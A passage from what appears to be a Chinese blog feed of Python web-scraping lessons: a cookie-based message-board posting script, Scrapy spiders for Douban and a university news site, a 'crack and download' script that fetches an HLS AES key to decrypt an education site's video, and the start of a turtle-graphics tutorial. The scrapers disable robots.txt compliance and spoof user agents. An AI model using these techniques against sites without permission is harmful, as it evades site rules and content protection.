punctuation">,</span>    <span class="token punctuation">}</span>login<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>cookies<span class="token operator">=</span>login<span class="token punctuation">.</span>cookies<span class="token keyword">print</span><span class="token punctuation">(</span>cookies<span class="token punctuation">)</span><span class="token comment">#用cookies登陆</span>url_2<span class="token operator">=</span><span class="token string">'http://10.163.72.55/messagePost.php'</span>params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'gb_word'</span><span class="token punctuation">:</span><span class="token string">'没想到吧，我还是可以留言，哈哈'</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_2<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">)</span>res_json <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_json<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="十、使用scrpit框架爬豆瓣"><a href="#十、使用scrpit框架爬豆瓣" class="headerlink" title="十、使用scrpit框架爬豆瓣"></a>十、使用scrpit框架爬豆瓣</h2><pre class="line-numbers language-dos" data-language="dos"><code class="language-dos">pip install scrapy -i https://pypi.tuna.tsinghua.edu.cn/simple/ # 安装环境scrapy startproject douban # 创建项目scrapy crawl douban #运行工程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>爬虫模块</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'douban'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'book.douban.com'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'https://book.douban.com/top250?start=0'</span><span class="token punctuation">]</span>    <span class="token comment"># 根据url的规律，构建出前三页地址</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string">'https://book.douban.com/top250?start='</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x <span class="token operator">*</span> <span class="token number">25</span><span class="token punctuation">)</span>        start_urls<span class="token punctuation">.</span>append<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 爬取的数据存储在response.text</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        datas <span class="token operator">=</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'tr'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> data <span class="token keyword">in</span>  datas<span class="token punctuation">:</span>            <span class="token comment">#实例化DoubanItem类。</span>            item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment"># 书名</span>            item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>            <span class="token comment">#提取出出版信息，并把这个数据放回DoubanItem类的publish里。</span>            item<span class="token punctuation">[</span><span class="token string">'publish'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'pl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token comment"># 评分</span>            item<span class="token punctuation">[</span><span class="token string">'score'</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'rating_nums'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token comment">#yield item是把获得的item传递给引擎。</span>            <span class="token comment">#有点类似return，不过它和return不同的点在于，它不会结束函数，且能多次返回信息</span>            <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>数据处理模块</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># （数据管道）部门则是公司的数据部门</span><span class="token comment"># 只负责存储和处理Spiders部门提取到的有用数据。这个对应的是爬虫流程【存储数据】这一步。</span><span class="token keyword">import</span> scrapy<span class="token comment">#定义一个类DoubanItem，它继承自scrapy.Item</span><span class="token keyword">class</span> <span class="token class-name">DoubanItem</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># scrapy.Field() 相当于自定义字典类型</span>    title <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#定义书名的数据属性</span>    publish <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#定义出版信息的数据属性</span>    score <span class="token operator">=</span> scrapy<span class="token punctuation">.</span>Field<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#定义评分的数据属性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span>USER_AGENT <span class="token operator">=</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token comment"># 是否需要遵守爬虫规则，改成不遵守</span>ROBOTSTXT_OBEY <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>设置</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 保存爬取的数据</span>FEED_URI<span class="token operator">=</span><span class="token string">'./storage/data/%(name)s.csv'</span>FEED_FORMAT<span class="token operator">=</span><span class="token string">'csv'</span>FEED_EXPORT_ENCODING<span class="token operator">=</span><span class="token string">'ansi'</span> <span class="token comment"># 导出文件编码，ansi是一种在windows上的编码格式</span>USER_AGENT <span class="token operator">=</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token comment"># 是否需要遵守爬虫规则，改成不遵守</span>ROBOTSTXT_OBEY <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment"># 爬虫的速度</span>DOWNLOAD_DELAY <span class="token operator">=</span> <span class="token number">0.5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>主程序启动模块</strong> <em><strong>（和scrapy.cfg同级）</strong></em></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#导入cmdline模块,可以实现控制终端命令行。</span><span class="token keyword">from</span> scrapy <span class="token keyword">import</span> cmdline<span class="token comment">#用execute（）方法，输入运行scrapy的命令。</span>cmdline<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'scrapy'</span><span class="token punctuation">,</span><span class="token string">'crawl'</span><span class="token punctuation">,</span><span class="token string">'douban'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>作业：爬取当当网前三页，书名，作者，价格<br><a href="http://bang.dangdang.com/books/bestsellers/01.00.00.00.00.00-year-2018-0-1-1">http://bang.dangdang.com/books/bestsellers/01.00.00.00.00.00-year-2018-0-1-1</a></p><p><strong>扩展提升</strong><br>爬取每一条新闻里的内容<br><a href="http://www.news.zjut.edu.cn/5415/list.htm">http://www.news.zjut.edu.cn/5415/list.htm</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># (爬虫)部门是公司的核心业务部门</span><span class="token comment"># 负责创建requests对象和接受引擎发送过来的response（Downloader部门爬取到的内容），从中解析并提取出有用的数据。</span><span class="token comment"># 它对应的是爬虫流程【解析数据】和【提取数据】这两步</span><span class="token keyword">import</span> scrapy<span class="token keyword">import</span> bs4<span class="token comment"># 需要引用DoubanItem，它在items里面。因为是items在top250.py的上一级目录，所以要用..items，这是一个固定用法。</span><span class="token keyword">from</span> <span class="token punctuation">.</span><span class="token punctuation">.</span>items <span class="token keyword">import</span> DoubanItem<span class="token comment"># DoubanSpider类继承自scrapy.Spider类</span><span class="token keyword">class</span> <span class="token class-name">DoubanSpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> <span class="token string">'douban'</span>   <span class="token comment"># 定义爬虫的名字，这个名字是爬虫的唯一标识</span>    <span class="token comment"># allowed_domains是定义允许爬虫爬取的网址域名（不需要加https://）。</span>    <span class="token comment"># 如果网址的域名不在这个列表里，就会被过滤掉</span>    <span class="token comment"># 一定在book.douban.com这个域名之下，防止爬到广告页面去</span>    allowed_domains <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'www.news.zjut.edu.cn'</span><span class="token punctuation">]</span>    <span class="token comment"># 定义起始网址，就是爬虫从哪个网址开始抓取</span>    <span class="token comment"># 注：allowed_domains的设定对start_urls里的网址不会有影响</span>    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'http://www.news.zjut.edu.cn/5415/list.htm'</span><span class="token punctuation">]</span>        <span class="token comment"># 解析下载器传过来的数据</span>    <span class="token keyword">def</span> <span class="token function">parse</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 爬取的数据存储在response.text</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        datas <span class="token operator">=</span> bs<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"news_title"</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> data <span class="token keyword">in</span> datas<span class="token punctuation">:</span>            href <span class="token operator">=</span> data<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'href'</span><span class="token punctuation">]</span>            link <span class="token operator">=</span> <span class="token string">'http://www.news.zjut.edu.cn/5415/list.htm'</span> <span class="token operator">+</span> href            <span class="token comment"># 链接先爬下来回传给引擎，引擎通过调度器给下载器，下载好了再传给我</span>            <span class="token keyword">yield</span> scrapy<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>link<span class="token punctuation">,</span> callback<span class="token operator">=</span>self<span class="token punctuation">.</span>parse2<span class="token punctuation">)</span>        <span class="token comment">#这个就是下载器下载好的数据</span>    <span class="token keyword">def</span> <span class="token function">parse2</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>        bs <span class="token operator">=</span> bs4<span class="token punctuation">.</span>BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>        item <span class="token operator">=</span> DoubanItem<span class="token punctuation">(</span><span class="token punctuation">)</span>        item<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bs<span class="token punctuation">.</span>find<span class="token punctuation">(</span>class_<span class="token operator">=</span><span class="token string">'arti_title'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">yield</span> item<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="破解并下载视频流"><a href="#破解并下载视频流" class="headerlink" title="破解并下载视频流"></a>破解并下载视频流</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span>re<span class="token punctuation">,</span>random<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token comment"># 伪装请求头</span>user_agent <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.9.168 Version/11.50'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0E; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C)'</span><span class="token punctuation">,</span>    <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36'</span><span class="token punctuation">]</span>headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>user_agent<span class="token punctuation">)</span><span class="token punctuation">}</span>url <span class="token operator">=</span> <span class="token string">'http://www.nvic.edu.cn/CompetitionVideo/Detail?worksId=3ddcd2d0-39f1-49b8-83a2-03b8e5ef780d&amp;sType=5&amp;competitionId=ce116ee4-ca64-4c16-9aff-750fed3335cf'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment"># 获取几个独立视频的链接</span>pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'data-path="(.*?)"'</span><span class="token punctuation">)</span>indexs_list<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> index <span class="token keyword">in</span> indexs_list<span class="token punctuation">:</span>    <span class="token comment"># 获取视频文件存放路径</span>    path <span class="token operator">=</span> index<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>index<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'URI="(.*?.key)"'</span><span class="token punctuation">)</span>    key<span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>     key_url <span class="token operator">=</span> path <span class="token operator">+</span> key  <span class="token comment"># 拼凑出key的地址</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_url<span class="token punctuation">)</span>    key_res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>key_url<span class="token punctuation">)</span> <span class="token comment"># 拿到key的内容</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已获取到key'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_res<span class="token punctuation">.</span>content<span class="token punctuation">)</span>    aes <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key_res<span class="token punctuation">.</span>content<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> <span class="token string">b'0000000000000000'</span><span class="token punctuation">)</span>  <span class="token comment"># 制作解密文件</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已成功制作解密文件'</span><span class="token punctuation">)</span>    <span class="token comment"># 拿视频碎片</span>    pattern<span class="token operator">=</span>re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'(filesequence\d+.ts)'</span><span class="token punctuation">)</span>    filesequences_list<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    count <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment"># 计数、缓解等待压力</span>    <span class="token keyword">for</span> filesequence <span class="token keyword">in</span> filesequences_list<span class="token punctuation">:</span>        filesequence_url <span class="token operator">=</span> path <span class="token operator">+</span> filesequence        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>filesequence_url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token comment"># 图片内容需要以二进制wb读写。</span>        video <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>key<span class="token punctuation">}</span></span><span class="token string">.mp4'</span></span><span class="token punctuation">,</span><span class="token string">'ab+'</span><span class="token punctuation">)</span>        <span class="token comment"># 获取pic的二进制内容</span>        video<span class="token punctuation">.</span>write<span class="token punctuation">(</span>aes<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment"># 关闭文件</span>        video<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[下载进度]:{}{:.2f}%"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token operator">*</span>count<span class="token punctuation">,</span>count<span class="token operator">/</span><span class="token builtin">len</span><span class="token punctuation">(</span>filesequences_list<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>廖老师Python海龟画图整理</title>
      <link href="/2022/10/18/%E5%BB%96%E8%80%81%E5%B8%88Python%E6%B5%B7%E9%BE%9F%E7%94%BB%E5%9B%BE%E6%95%B4%E7%90%86/"/>
      <url>/2022/10/18/%E5%BB%96%E8%80%81%E5%B8%88Python%E6%B5%B7%E9%BE%9F%E7%94%BB%E5%9B%BE%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><code>声明：所有资料都是从廖老师那里搬运来的，本人就是整理下方便大家复习，感谢廖老师的辛苦付出</code></p><h2 id="海龟画图"><a href="#海龟画图" class="headerlink" title="海龟画图"></a>海龟画图</h2><h3 id="0-基础知识"><a href="#0-基础知识" class="headerlink" title="0.基础知识"></a>0.基础知识</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#命令                        简化                   说明</span>turtle<span class="token punctuation">.</span>setup<span class="token punctuation">(</span>width<span class="token punctuation">,</span>height<span class="token punctuation">)</span>                     设置屏幕宽高turtle<span class="token punctuation">.</span>forward<span class="token punctuation">(</span>distance<span class="token punctuation">)</span>turtle<span class="token punctuation">.</span>fd<span class="token punctuation">(</span><span class="token punctuation">)</span>  向当前画笔方向移动distance像素长度turtle<span class="token punctuation">.</span>backward<span class="token punctuation">(</span>distance<span class="token punctuation">)</span>turtle<span class="token punctuation">.</span>bk<span class="token punctuation">(</span><span class="token punctuation">)</span>向当前画笔相反方向移动distance像素长度turtle<span class="token punctuation">.</span>right<span class="token punctuation">(</span>degree<span class="token punctuation">)</span>    turtle<span class="token punctuation">.</span>rt<span class="token punctuation">(</span><span class="token punctuation">)</span>        顺时针移动degree°turtle<span class="token punctuation">.</span>left<span class="token punctuation">(</span>degree<span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>lt<span class="token punctuation">(</span><span class="token punctuation">)</span>        逆时针移动degree°turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span>        turtle<span class="token punctuation">.</span>pd<span class="token punctuation">(</span><span class="token punctuation">)</span>turtle<span class="token punctuation">.</span>down<span class="token punctuation">(</span><span class="token punctuation">)</span>                            移动时绘制图形，缺省时也为绘制turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>                      将画笔移动到坐标为x<span class="token punctuation">,</span>y的位置turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span>            turtle<span class="token punctuation">.</span>pu<span class="token punctuation">(</span><span class="token punctuation">)</span>turtle<span class="token punctuation">.</span>up<span class="token punctuation">(</span><span class="token punctuation">)</span>                      提起笔移动，不绘制图形，用于另起一个地方绘制turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span>radius<span class="token punctuation">,</span>extent<span class="token punctuation">,</span>steps<span class="token punctuation">)</span>画圆，radius<span class="token punctuation">:</span>半径为正<span class="token punctuation">(</span>负<span class="token punctuation">)</span>，表示圆心在画笔的左边<span class="token punctuation">(</span>右边<span class="token punctuation">)</span>画圆，extent<span class="token punctuation">:</span>弧度一圈<span class="token number">360</span> steps<span class="token punctuation">:</span>多边形边数turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token punctuation">)</span>            设置画笔的宽度turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token punctuation">)</span>           设置画笔颜色turtle<span class="token punctuation">.</span>color<span class="token punctuation">(</span>color1<span class="token punctuation">,</span> color2<span class="token punctuation">)</span>设置边框颜色和绘图颜色turtle<span class="token punctuation">.</span>filling<span class="token punctuation">(</span><span class="token punctuation">)</span>         返回当前是否在填充状态turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>         准备开始填充图形turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span>           填充完成turtle<span class="token punctuation">.</span>colormode<span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span>          切换为RGB颜色模式  turtle<span class="token punctuation">.</span>color<span class="token punctuation">(</span>red<span class="token punctuation">,</span>green<span class="token punctuation">,</span>blue<span class="token punctuation">)</span>   使用RGB颜色模式设置颜色turtle<span class="token punctuation">.</span>home<span class="token punctuation">(</span><span class="token punctuation">)</span>              设置当前画笔位置为原点，朝向东turtle<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>直径<span class="token punctuation">,</span> <span class="token operator">*</span>color<span class="token punctuation">)</span>         color默认为画笔颜色<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随机模块import random</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token comment">#用于生成一个0到1的随机浮点数: 0 &lt;= n &lt; 1.0</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token comment">#返回a,b之间的整数，范围[a,b]，注意：传入参数必须是整数，a一定要比b小。</span>random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token punctuation">[</span>start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> stop<span class="token punctuation">[</span><span class="token punctuation">,</span> step<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#返回前闭后开区间[start,stop)内的整数，可以设置step。只能传入整数。</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>sequence<span class="token punctuation">)</span><span class="token comment">#从sequence（序列，列表、元组和字符串）中随机获取一个元素。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-画一个边长100的正方形"><a href="#1-画一个边长100的正方形" class="headerlink" title="1.画一个边长100的正方形"></a>1.画一个边长100的正方形</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> turtle <span class="token keyword">as</span> tt<span class="token punctuation">.</span>setup<span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      t<span class="token punctuation">.</span>fd<span class="token 